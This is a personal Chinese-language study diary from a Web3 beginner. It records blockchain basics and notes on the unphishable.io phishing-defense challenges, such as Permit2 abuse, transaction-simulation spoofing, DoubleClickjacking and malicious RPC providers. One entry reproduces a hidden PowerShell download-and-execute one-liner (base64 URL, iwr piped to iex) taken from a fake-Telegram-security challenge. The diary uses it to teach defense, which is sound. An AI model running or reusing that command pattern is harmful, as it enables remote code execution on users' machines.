   - **原理**：用户只需表达目标（意图），Solver 网络竞争寻找最佳执行路径。
   - **案例**：UniswapX、1inch Fusion。
2. **账户抽象（AA）**
   - **原理**：让钱包像智能合约一样灵活，支持 Gas 代付、社交恢复、多重签名等。
   - **案例**：Safe、Argent、ZeroDev。
3. **模块化区块链**
   - **原理**：将执行、共识、数据可用性、结算分离，提高可扩展性。
   - **案例**：Celestia（数据可用性层）、OP Stack（Rollup 框架）。
4. **AI + Web3 深度融合**
   - 去中心化 AI 训练（分布式 GPU 网络）、AI 代理、AI 生成 NFT。

### 作为初学者一个星期了解完后目前的目标：

先走技术向，学习智能合约开发以及区块链安全争取找到一个实习。然后通过深入社区了解Web3背后的金融知识并真正参与到Web3的建设与开发中。

# 2025-08-08

##  https://unphishable.io/ 钓鱼攻防挑战高级篇

### 0x0027 NFT 批准网络钓鱼攻击

 调用了setApprovalForAll 函数，仔细观看调用函数再确认授权即可防止

### 0x0028 Uniswap V3 多路呼叫网络钓鱼攻击

首先是一个permit类型的方法签名，其次是调用spender中有Uniswap V3: Multicall，去搜索了一下这个函数

```solidity
  function multicall(
    bytes[] data
  ) external payable override returns (bytes[] results)
```

Call multiple functions in the current contract and return the data from all of them if they all succeed

调用当前合约中的多个函数，如果全部成功则返回所有函数的数据。aggregate函数也有类似的问题。

**合约地址“看起来没问题”**：Multicall、Uniswap 路由、Permit2 都是**头部项目的真合约**。

**动作被拆分**：钱包在发起“签名”时只提示“**签名**”，没看到**紧随其后的 on-chain 转账**。

由于上述两个原因因此很危险。

### 0x0029 函数选择器网络钓鱼攻击

这关最重要是收藏了两个工具

https://calldata.swiss-knife.xyz/decoder用于解码完整数据

https://openchain.xyz/signatures 用于解码识别函数

### 0x0030 安全代理合约攻击

execTransaction函数：

```solidity
function execTransaction(
  address to,
  uint256 value,
  bytes   calldata data,
  Enum.Operation operation,     // 0 = CALL, 1 = DELEGATECALL
  uint256 safeTxGas,
  uint256 baseGas,
  uint256 gasPrice,
  address gasToken,             // 0 表示用 ETH 退款
  address payable refundReceiver,
  bytes   calldata signatures   // 多个签名按要求拼接
) external payable returns (bool success);
```

**to**：实际要调用的目标合约（或收款地址）。

**value**：随调用转出的 ETH 数量（wei）。

**data**：给 `to` 的 calldata（比如 `transfer() / permit() / swap()` 的 ABI 编码）。

**operation**：

- `CALL(0)`：普通外部调用（最常用）；
- `DELEGATECALL(1)`：**把目标代码在 Safe 的存储上下文里执行**（高危，通常只给审计过的模块/批量器使用）。

**safeTxGas**：**真正留给目标调用的 gas** 上限（防“卡气”作恶）。

**baseGas**：签名验证、日志、退款等“围绕交易的固定开销”估算，用于退款计算。

**gasPrice / gasToken / refundReceiver**：**谁来收退款、用什么币退款、按什么单价退**；

- `gasToken = address(0)` → 退款用 ETH；
- 非 0 → 退款用该 ERC-20（Safe 会从金库里付给 `refundReceiver`）；
- `refundReceiver = address(0)` 时，常见逻辑是把退款给 `tx.origin`（执行者）。

**signatures**：把所有签名人对这笔 SafeTx 的签名按指定格式拼接

暂时看不太懂，等下周学习一下开发后再进行深究

### 0x0031 交易模拟欺骗

很恐怖的一个诈骗，核心原理是利用模拟交易跟真实交易的时间差从而在后台修改金额

个人感受就是需要识别钓鱼网站，识别正确的官方DeFi平台，不要贪图小便宜

#### 漏洞利用机制

核心漏洞在于交易模拟和执行之间的时间间隔。恶意行为者开发了钓鱼网站，可以在这个关键窗口期间操纵链上状态，从而造成灾难性的后果。

1. 攻击者创建了一个看似合法的 DeFi 网站，提供“免费空投”或其他诱人的奖励。
2. 当用户试图领取奖励时，网站会提示他们签署交易。
3. 用户的钱包显示交易模拟，表明这只是一个简单的索赔操作，只需要花费少量的 ETH 作为 gas。
4. 然而，在用户确认之后但在交易被挖掘之前，攻击者的后端会迅速改变合约状态。
5. 当交易最终执行时，它实际上是将用户钱包中的所有资产转移到攻击者的地址。

### 0x0032 DoubleClickjacking 攻击

#### DoubleClickjacking 的工作原理

DoubleClickjacking 是一种高级点击劫持技术，可以绕过 X-Frame-Options、SameSite Cookie 或 CSP 等标准保护措施。其工作原理如下：

1. 攻击者创建一个看起来像合法验证或授权页面的页面。
2. 当用户双击看似合法的元素（如 reCAPTCHA 复选框或“授权应用程序”按钮）时，可见页面会捕获第一次点击。
3. 第二次点击会被按钮上方的隐藏元素捕获，从而触发恶意操作。
4. 这种技术之所以有效，是因为许多框架破坏技术只能防止单击，而不能防止双击。

简单第一个页面看起来像合法，要求双击，点击第一个页面后会迅速跳转出第二个页面从而识别到了第二次点击触发钓鱼。

### 0x0033 假验证码钓鱼

Web2中的老东西，欺骗你使用shell执行一些有害代码从而实现RCE，永远不要运行奇怪的系统命令

### 0x0034 Google 的电子邮件欺骗攻击（最难的题目）

用google的工具分析标题https://toolbox.googleapps.com/apps/messageheader/analyzeheader

| #    | Delay  | From *                                                 |      |          | To *                                   | Protocol                       | Time received            |      |
| :--- | :----- | :----------------------------------------------------- | :--- | :------- | :------------------------------------- | :----------------------------- | :----------------------- | ---: |
| 0    |        | fwd-04-1.fwd.privateemail.com                          | →    | [Google] | mx.google.com                          | [ESMTPS](http://goo.gl/6qofAE) | 2025/4/10 GMT+8 12:27:42 |      |
| 1    | -1 sec | localhost                                              | →    |          | fwd-04.fwd.privateemail.com            | [ESMTPS](http://goo.gl/6qofAE) | 2025/4/10 GMT+8 12:27:41 |      |
| 2    |        | localhost                                              | →    |          | fwd-04.fwd.privateemail.com            | [ESMTP](http://goo.gl/NDeDL)   | 2025/4/10 GMT+8 12:27:41 |      |
| 3    |        | unknown                                                | →    |          | fwd-04.fwd.privateemail.com            | [ESMTP](http://goo.gl/NDeDL)   | 2025/4/10 GMT+8 12:27:41 |      |
| 4    | -1 sec | DIR-08                                                 | →    |          | localhost                              |                                | 2025/4/10 GMT+8 12:27:40 |      |
| 5    |        | mta-02.privateemail.com                                | →    |          | DIR-08                                 |                                | 2025/4/10 GMT+8 12:27:40 |      |
| 6    |        | unknown                                                | →    |          | mta-02.privateemail.com                | [ESMTP](http://goo.gl/NDeDL)   | 2025/4/10 GMT+8 12:27:40 |      |
| 7    | -1 sec | mail-uksouthaz17010003.outbound.protection.outlook.com | →    |          | asp-relay-pe.jellyfish.systems         | [ESMTPS](http://goo.gl/6qofAE) | 2025/4/10 GMT+8 12:27:39 |      |
| 8    | -2 sec | LO2P265MB5805.GBRP265.PROD.OUTLOOK.COM                 | →    |          | CWLP265MB6786.GBRP265.PROD.OUTLOOK.COM |                                | 2025/4/10 GMT+8 12:27:37 |      |
| 9    |        | LO2P265MB5805.GBRP265.PROD.OUTLOOK.COM                 | →    |          | LO2P265MB5805.GBRP265.PROD.OUTLOOK.COM | [mapi](http://goo.gl/rDNFv)    | 2025/4/10 GMT+8 12:27:37 |      |
| 10   | 5 sec  |                                                        | →    |          | 2002:a05:6402:3b8a:b0:4c5:432a:5706    | [SMTP](http://goo.gl/LvgJt)    | 2025/4/10 GMT+8 12:27:42 |      |
| 11   |        |                                                        | →    |          | 2002:a05:6402:3b8a:b0:4c5:432a:5706    | [SMTP](http://goo.gl/LvgJt)    | 2025/4/10 GMT+8 12:27:42 |      |

在上述将所有域名都尝试了还是不对，卡住了

### 0x0035 Zoom面试钓鱼

识别真正的Zoom域名：**zoom.us**

### 0x0036 虚假 Zoom 会议钓鱼

跟0x0036一样，需要确认Zoom的官方域名，以及不要运行任何代码在shell中。

# 2025-08-07

##  https://unphishable.io/ 钓鱼攻防挑战中级篇

### 0x0013 0价值转账记录

根据前端只显示前四位和后四位进行账号欺诈，需要点进去进行核实比对

### 0x0014 NFT钓鱼

NFT钓鱼，账单详情中存在startAmount 和 endAmount 都设置为“0”，因此这是一个免费转移NFT的请求

### 0x0015 签名方法钓鱼

总结：

#### eth_sign（遗留，危险）

eth_sign 是最早的签名方法之一，但也是最危险的。它允许对任何数据进行签名，无需任何前缀或保护。

eth_sign 是许多钱包（如 MetaMask、Safe 等）中已弃用的签名方法，因为它太危险了。

#### personal_sign（标准消息签名）

这种方法添加了前缀，使其更安全，需要自己阅读内容

#### signTypedData（EIP-712）

这种方式比较结构化，比较安全，也需要自己阅读内容和确认参数

### 0x0016 地址前缀/后缀钓鱼

与0x0013类似，防止地址前缀/后缀钓鱼，需要完整看完整个地址

### 0x0017 Uniswap Permit2 网络钓鱼

#### 什么是Permit2

[Permit2](https://github.com/Uniswap/permit2) 是 Uniswap Labs 推出的一个改进版的授权协议，

- **传统模式：你直接批准代币给特定合约（例如 Uniswap）**
- **Permit2 模型：您批准代币给 Permit2 合约，然后由合约内部管理权限**

#### Permit2 网络钓鱼原理

攻击者利用 Permit2 的设计特性，通过诱导用户“签署授权”操作，实则让用户签署了一个允许攻击者无限花费其代币的 Permit2 授权。具体过程可能如下：

1. **钓鱼网站伪装**成空投网站或 DApp（如 fake Uniswap/Blur/LayerZero 等）；
2. 用户连接钱包后，网站提示用户**“签名以验证身份”或“领取空投”**；
3. 实际签署的却是一个**Permit2 授权**，允许攻击者地址在长时间或无限时间内使用你的 Token；
4. 攻击者稍后调用 Permit2 合约，从你钱包中**直接转走资产**；
5. **无需再次签名、无需主动发起交易**，你资产就可能被转走。
6. **用户即使之后撤销了 token 对 Permit2 的 approve**，但只要再次授权，攻击者依然有权限转账（因为内部权限未撤销）

#### 如何保护自己：

1. 使用 ScamSniffer 的 Permit2 授权管理等工具来查看和撤销内部 Permit2 权限
2. 对签名请求要谨慎，尤其是那些要求无限制金额的签名请求
3. 验证签名请求中的支出者地址
4. 使用显示详细签名信息的硬件钱包
5. 如果不确定某个网站是否可信，可使用小号钱包参与交互。

### 0x0018 Discord 书签攻击模拟

#### 书签攻击的工作原理(javascript一句话木马)

书签攻击是指诱骗用户将恶意 JavaScript 代码添加到其浏览器书签中。在 Discord 上点击这些书签时，它们可能会执行有害代码，窃取敏感信息或控制账户。结果：账号被盗

###  0x0019 DeFi 代理合约钓鱼攻击

本质还是需要仔细看交易请求中的数据。这里调用setOwner 函数会获取代理合约控制权

### 0x0020恶意 RPC 提供程序

#### 什么是RPC

RPC，全称是 **Remote Procedure Call（远程过程调用）**，是一种计算机通信协议，允许一个程序调用另一个位于**不同地址空间（通常是不同主机）**的程序或服务，就像调用本地函数一样。

把 RPC 想象成你在本地电脑上写了一个函数 `getUserInfo()`，但这个函数的真正执行过程是在另一台服务器上完成的。你只需要发出“请求”，远程服务器帮你处理，然后把结果“返回”给你，就像你在本地调用这个函数一样简单。

#### 恶意 RPC 提供程序的工作原理

恶意 RPC 提供程序可以：

- 拦截并修改你的交易，将资金重定向到攻击者的地址
- 显示虚假的代币余额，让你相信你收到了不存在的付款
- 提供虚假的交易状态，让您认为交易失败并提示重试
- 收集您的交易历史记录和钱包活动数据

#### 如何保护自己

- 仅使用知名且值得信赖的 RPC 提供商
- 验证你的钱包所连接的 RPC URL
- 使用硬件钱包来提高安全性
- 考虑运行自己的节点以获得最大程度的安全性

### 0x0021 Telegram 假冒安全保障诈骗

web2.0 安全的老套路，利用base64加密绕过一些限制，其实是想RCE电脑

```powershell
powershell -w hidden -c $a='aHR0cDovL2xvY2FsaG9zdC90ZXN0LnR4dA==';
$b=[Convert]::FromBase64String($a);
$c=[System.Text.Encoding]::UTF8.GetString($b);
$d="iwr $c | iex";
Invoke-Expression $d;

```

虽然没学过shell脚本写法，但是base64解码出http://localhost/test.txt，肯定不对劲

### 0x0022 紧急 DAO 提案

点击投票按钮显示：

I authorize the transfer of all my assets to 0x1234567890abcdef1234567890abcdef12345678

我授权将我的所有资产转移，很明显只需要看执行内容即可

### 0x0023 高级治理网络钓鱼

三种钓鱼手段复合：请求恶意交易签名，实际上会转移你的代币或授予批准，使用相似域名进行 URL 欺骗，方法选择符 0x0900f010？貌似是java里面的反序列化攻击。预防就是检查检查再检查，小心小心再小心。

### 0x0024 冒充网络钓鱼攻击

简单的识别账户，看转发收藏点赞等即可

### 0x0025 Tornado Cash 网络钓鱼攻击

 真正的 Tornado Cash 域名是 tornado.cash，但是我点进去metamask提示我有风险导致我不敢点，还是要多方面确保域名是官方的

### 0x0026 令牌精准钓鱼攻击

数字精度欺诈，需要尽可能精确的保留浮点数

#### 攻击如何运作：

1. 攻击者说服受害者将令牌的小数部分从正确值（通常为 18）更改为 0
2. 小数决定了 token 可以被分成的小数位数，从而影响 token 的显示方式
3. 当 Decimals 设置为 0 时，钱包会将少量代币显示为整数
4. 攻击者转移了极少量的代币（例如 0.00000000000089589 USDT），但在受害者的钱包中却显示为 89589 USDT
5. 看到大量“恢复”的资金，受害者相信了攻击者，并根据要求提供私钥或转移资金

# 2025-08-06

## 1.公链 vs 私链 vs 联盟链

| 区块链类型 | 节点加入方式        | 数据可见性     | 管理模式               | 适合场景           |
| :--------- | :------------------ | :------------- | :--------------------- | :----------------- |
| **公链**   | 任何人自由加入      | 所有人可见     | 去中心化（大家投票）   | 加密货币、公共存证 |
| **联盟链** | 需联盟成员邀请/审批 | 仅联盟成员可见 | 多中心化（董事会决策） | 供应链、金融协作   |
| **私链**   | 由老板严格审批      | 仅内部成员可见 | 中心化（老板说了算）   | 企业内部管理、审计 |

## 2.Web3 vs Web 3.0 vs Web2

### Web2（当前互联网）

**核心特征**：

- **中心化控制**：数据存储在科技巨头的服务器（如 Google、Facebook）
- **用户角色**：内容生产者，但不拥有数据
- **商业模式**：广告驱动，平台抽取佣金
- **典型应用**：微信、抖音、亚马逊

**比喻（个人感觉十分通俗易懂）**：

就像租房子，你可以装饰（发内容），但房东（平台）随时能收回钥匙（封号）。

### Web 3.0（语义网）和 Web3（去中心化互联网）

未接触过的概念在入门教程的基础上我使用AI进行了更加深入的搜索和理解：

| 比较维度         | Web3.0                                                       | Web3                                                      |
| ---------------- | ------------------------------------------------------------ | --------------------------------------------------------- |
| 提出背景         | 万维网的自然演进（Web1 → Web2 → Web3.0）                     | 区块链和加密技术的兴起                                    |
| 核心技术         | 语义网、AI、大数据、知识图谱                                 | 区块链、智能合约、代币经济、NFT                           |
| 目标             | 让互联网能理解和处理语义，实现更智能的服务                   | 建立去中心化的互联网，用户掌控数据和身份                  |
| 是否去中心化     | 不一定                                                       | 是                                                        |
| 是否强调价值流通 | 否                                                           | 是，强调token化资产                                       |
| 代表人物         | Tim Berners-Lee                                              | Gavin Wood（以太坊联合创始人）等                          |
| 举例             | 搜索引擎能“理解”你要找的内容，而非关键词匹配；AI 助手能理解语义提供智能服务 | 以太坊DApp（如Uniswap）、钱包MetaMask、NFT交易平台OpenSea |

### 示例1：使用搜索引擎

- **Web2（现在）**：
  - 你搜索“我的老婆生日送什么礼物”，百度/Google 主要是关键词匹配，推荐“老婆 生日 礼物”几个热榜文章。
- **Web3.0（语义理解）**：
  - 系统理解你指的“老婆”是“配偶”，分析她的年龄、兴趣，结合你们之间的聊天内容、购买记录，推荐个性化礼物建议。这是**AI+语义网**带来的提升。
- **Web3（区块链）**：
  - 你可以在一个去中心化平台买NFT作为生日礼物，支付用以太坊，不需要第三方平台记录交易，数据你自己保管。

------

### 示例2：用社交平台发文

- **Web2.0**：你用微博发文，内容、点赞、粉丝数据都存在微博公司服务器上。
- **Web3.0**：平台能自动识别你发文内容的语义，推荐给真正感兴趣的人，AI自动处理标签和话题。
- **Web3**：你在去中心化社交平台（如Lens Protocol）发文，数据存储在链上，自己掌控，任何人不能随意封号或删帖。

### 总结一句话

**Web3.0 是互联网更“聪明”了，Web3 是互联网更“自由”了。**

## 3.区块链岗位全景图

由于本人是计算机科学背景出身这里只举例技术岗

岗位主要包含前端工程师、后端工程师、智能合约工程师

举例说明：三者如何协作（用一次交易流程来说明）

1. **用户**打开网页，在前端输入想兑换的代币数量。
2. **前端工程师**负责发起钱包连接，并在点击“交易”按钮后调用合约的 `swap()` 方法。
3. **智能合约工程师**编写并部署 `swap()` 合约逻辑，确保资金安全且正确更新链上状态。
4. **后端工程师**监听链上 `SwapExecuted` 事件，将这次交易记录入数据库，用于后续统计展示。

用户交互（前端）→ 数据服务（后端）→ 核心规则（合约）

看完具体职责后目前想优先学习智能合约工程这一部分内容，前后端的职责感觉与传统web2前后端较为相似

## 4.安全与合规

本人之前主要参与web2.0安全的学习，因此这部分着重法规上面的学习。

emmmm，由于金融知识的匮乏看完之后懵懵懂懂的，这里就总结一下看懂的：

- 不要发行虚拟代币

- 不要随意进行虚拟货币的赌博行为（USDT 购买盲盒）

- 在参与虚拟币兑换时必须谨慎，对交易对手的信息、背景、资金来源进行审核，避免成为非法资金链条中的一环。

- 关于虚拟货币签订的合同国内不认可，不受到法律保护
- 雇佣关系可能存在问题
- 薪酬结构“人民币 + Token”或“全 USDT”存在多重法律与税务风险
- 虚拟货币换成rmb时容易有风险
- 项目可能不合法需要提前审查

emmm总结一句就是目前还是多学习技术为主，法律的灰色地带风险太多，容易进去）

# 2025-08-05

## 理论：Web3基础概念学习

在 [My First NFT](https://nft.myfirst.io/) 这个网站结合[学习指南](https://web3intern.xyz/zh/blockchain-basic/)弄明白了一些Web3基础术语

### 1.区块链是什么

区块链是一种去中心化的分布式账本技术，用于在网络节点之间安全、透明且不可篡改地记录事务数据。

由一个区块和一个链组成。区块通过链表的数据结构进行连接。



### 2.区块链的特性

#### **不可篡改**

你无法改变历史信息，因为每个区块包含了上一个区块的摘要并串联起来，如果你修改了历史的区块，你将必须修改后面的全部区块

- **如何保障？**

  区块链网络通常分布在全球，每个节点都将会存储一份相同的区块链数据。没有人能够控制全部的节点，因此这份区块链数据将会一直存在。区块链网络通常分布在全球，一个人控制大部分节点几乎不可能，因此即便有人修改了部分节点的区块链数据，只要被修改记录的节点不超过 51%，这个改动将不会被认可。

#### **公开透明、匿名**

在区块链上的信息全部公开透明。每个人都可以顺着区块和链找到历史上所有的记录来查看你的钱包余额。但是没人知道这是你的钱包。

#### **快速交易**

无论金额多少以及你在什么地方，只要你的交易记录被打包在区块链中，交易就自动完成。相比传统的跨国汇款非常快速便捷。

### 3.加密货币基础

去中心化和分布式网络很好，可是为什么会有人愿意提供这项服务呢？

#### 节点可以得到奖励

网络节点服务提供商（以下简称为网络服务提供商）可以得到奖励。不同的网络服务提供商可以得到不同的代币奖励，比如：比特币。根据比特币的设计，它仅有有限的供应量，而且可以自由转账。因此具备了货币的特性，成为了加密货币。以太坊和以太币类似与比特币和比特坊的关系。

### 4.同质化代币（FT）和非同质化代币（NFT）

同质化代币（FT，全称 Fungible Token）是可以被任意交换的代币，就像钱一样。举例：1USD = 6.3RMB，5USD+5USD=10USD

非同质化代币（NFT，全称 Non-fungible Token）则是独一无二、完全不同，难以用来平等交换的代币。举例：带有编号的bilibili装扮或者QQ装扮，一些属于自己的艺术创作。

### 5.NFT的价值与特性

#### 特性

##### **独一无二，不可分割**

每一个 NFT 都不可分割，独一无二，无法等价交换。

##### **不可篡改，公开透明**

NFT 基于区块链技术，任何人都可以查看且不可篡改。

##### **万物皆可 NFT**

NFT 可以在虚拟世界代表任意非钱币的实体。

##### **完全控制权**

NFT 所有者将对其拥有永久、完全的控制权，不可被剥夺。（大部分数字藏品并不算真正的 NFT，因为不在公链上，可以被平台控制）

##### **确权成本低**

验证某人是否拥有某个 NFT 的成本非常低，可以快速确认版权归属。

##### **无限想象空间**

NFT 的具体功能和玩法由参与者定义，具有无限想象空间。

#### 价值

仅仅举例。参考[My First NFT](https://nft.myfirst.io/)

##### 游戏

现状

游戏里的虚拟资产仅限于当前游戏，无法在游戏之间流通，且受限于游戏平台规则，所以玩家很难进行自由买卖。另外游戏账号也并非被你拥有，一旦被封号你将失去所有游戏资产。

未来

结合区块链和 NFT 技术，开发者可以设计出具有唯一性的游戏虚拟资产，且完全归属于个人，例如账号、武器、工具、房屋、宠物等，玩家可以自由的进行游戏资产的交易和流通。

##### 版权确认

现状

被盗版之后，很难确权，需要准备大量文件和记录。导致小规模盗版事件频发也无可奈何。

未来

NFT 并不能解决盗版问题，但是相比传统的盗版艰难的反侵权诉讼而言，仅需要几秒即可确定你是否拥有版权。也非常容易确认谁最先创造了这个物品。

未来正规商业公司在采用素材时，非常容易确认谁是所有者，提升商业合作效率降低风险和盗版事情的发生。

### 一些专有名词

DYOR:Do your own research，意思是你要自己做研究来决定是否购买，是一个免责声明。

FOMO，全称 Fear of missing out，意思是害怕失去机会。在这种情绪下，往往会高价接盘，容易被套牢。

FUD，全称 Fear, uncertainty, and doubt，意思是害怕猜疑不确定。在这种情绪下，往往会低价出货，容易卖飞了。



## 实践：在 [My First NFT](https://nft.myfirst.io/) mint 第一个 NFT

跟随网站教程进行了实践

https://sepolia.etherscan.io/tx/0x4416ce3118bba32badfb3331f8d8601f0b29e4179d533c5b1784afd24fb7cac6

## 实践：完成了 https://unphishable.io/ 钓鱼攻防挑战中的beginner挑战

- 0x0001:注册metamask和获取测试币
- 0x0002,0x0008:钱包恢复助手，记得永远不要给助记词且钱包跟web2不一样无法被客服挽回
- 0x0003,0x0004,0x0005,0x0007:授权许可攻击，需要仔细看授权
- 0x0006,0x0009,0x0011:假域名钓鱼，需要仔细甄别域名
- 0x0010:印象深刻的一关《剪贴板网络钓鱼挑战》，没想过复制地址可能下套，复制地址需要仔细对比
- 0x0012:恶意软件网络钓鱼模拟1.在输入凭据或下载软件之前，请务必验证 URL。2.仅从 Microsoft 官方网站或应用商店下载 Microsoft Teams。3.对任何不寻常的安装过程或请求保持怀疑。
- 0x0037:浏览器扩展欺骗，根据使用人数进行判断

# 2025-08-04

## 1.完成了工具安装与相关平台账号注册

- Metamask（成功获取了Sepolia测试币，并转账给了共学伙伴）
- Zoom
- Telegram
- Twitter
- Discord
- Github（老早就搞定了）
- Linkedln（老早注册了但是没找到合适intern投）


# 2025.07.30


<!-- Content_END -->
